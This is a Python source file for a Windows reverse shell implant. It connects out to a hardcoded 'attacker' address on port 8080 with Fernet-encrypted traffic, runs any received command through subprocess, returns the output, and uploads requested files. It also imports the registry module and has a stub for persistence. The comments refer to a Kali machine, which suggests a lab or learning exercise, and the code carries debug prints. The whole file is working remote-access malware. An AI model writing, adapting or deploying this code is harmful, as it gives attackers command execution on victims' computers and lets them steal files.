import socket # For Building TCP Connection
import subprocess # To start the shell in the system
from printlib import *
from os import path
import winreg as wreg
import shutil
from cryptography.fernet import Fernet

iv = ""
key = b"2dx_RB2Ike6XOIup0MgkAJ7uUDgq4-J2if2KNKgUIGo="

temp_cipher = b""

remote_port = 8080
remote_ip = "10.0.0.18"

def new_cipher():
    pass

def encrypt(plain_text):            #accepts a plaintext (unencoded) string
    cipher_suite = Fernet(key)
    cipher_text = cipher_suite.encrypt(plain_text.encode())
    return cipher_text              #Returns an encoded string

def decrypt(cipher_text, eol=False):           #accepts an encoded string    
    global temp_cipher
    temp_cipher = temp_cipher + cipher_text
    if type(cipher_text) is not bytes:
        cipher_text = cipher_text.encode()
    cipher_suite = Fernet(key)
    print("CIPHER:", cipher_text)
    plain_text = cipher_suite.decrypt(cipher_text)
    return plain_text                #Returns an encoded string

def send_data(s, plain_text):
    #s.send(encrypt(msg)+b"[END]")
    s.send(encrypt(plain_text))
    #s.send(encrypt(msg).encode('utf-8')+b"[END]")
    print_info("Sent:\n"  +plain_text)

def file_transfer(s, file_name):
    if path.exists(file_name):
        f = open(file_name, 'rb')
        data = f.read(128)
        print_info("Sending File:\n" + file_name)
        while data:
            s.send(encrypt(data)) 
            data = f.read(128)
        s.send(encrypt("DONE").encode('utf-8'))
        f.close()
        
    else: # the file doesn't exist
        send_data(s, "FILE_NOT_FOUND")
        data = ""

def connect(remote_ip=remote_ip, remote_port=remote_port):
    data = ""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # start a socket object 's' 
    s.connect((remote_ip, remote_port)) # Here we define the Attacker IP and the listening port
 
    while True: # keep receiving commands from the Kali machine
        while not data.endswith('[END]'):
            recv = s.recv(128)
            if recv == b"END":
                recv_decrypted = decrypt(recv, eol=True)
            else:
                recv_decrypted = decrypt(recv)
            if type(recv_decrypted) is bytes:
                recv_decoded = recv_decrypted.decode('utf-8')
            data = data + recv_decoded
        data = data.rstrip('[END]')
        print_info("Received:\n" + data)
        if 'kill' in data: # if we got terminate order from the attacker, close the socket and break the loop
            print_warn("Received kill command")
            s.close()
            break 
        elif "get" in data:
            file_name = data.split()[1]
            file_transfer(s, file_name)
            data = ""
        elif "persist" in data:
            #persist(s, data)
            data = ""        
        else: # otherwise, we pass the received command to a shell process
            #cmds = data.split()
            output = subprocess.getoutput(data)
            send_data(s, output) # send back the result
            send_data(s, "[END]")
            data = "" #reset the data received
def main ():
    connect(remote_ip,remote_port)
main()